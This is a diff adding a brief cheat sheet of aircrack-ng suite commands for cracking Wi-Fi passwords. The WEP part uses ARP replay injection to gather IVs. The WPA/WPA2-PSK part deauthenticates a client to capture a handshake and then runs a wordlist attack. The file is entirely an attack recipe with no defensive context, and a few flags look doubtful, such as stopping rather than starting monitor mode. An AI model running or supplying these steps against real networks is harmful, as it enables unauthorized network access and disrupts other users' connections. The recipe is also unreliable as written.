@@ -1,0 +1,17 @@
+
+WEP :
+
+airmon-ng stop wlan0
+airodump-ng wlan0
+airodump-ng --ivs -w longas -c 6 --bssid MAC_AP wlan0 & --> listen
+aireplay-ng -3 -b MAC_AP -h MAC_client wlan0
+aircrack-ng -p 3 -w wordlist longas-01.cap
+
+WPA-PSK / WPA2-PSK :
+
+airmon-ng stop wlan0
+airodump-ng wlan0
+airodump-ng -w longas -c 6 --bssid MAC_AP wlan0 & --> listen
+aireplay-ng -0 1 -a MAC_AP -c MAC_client wlan0  --> until %listen% show : "WPA handshake"
+aircrack-ng -p 3 -w wordlist longas-01.cap
+
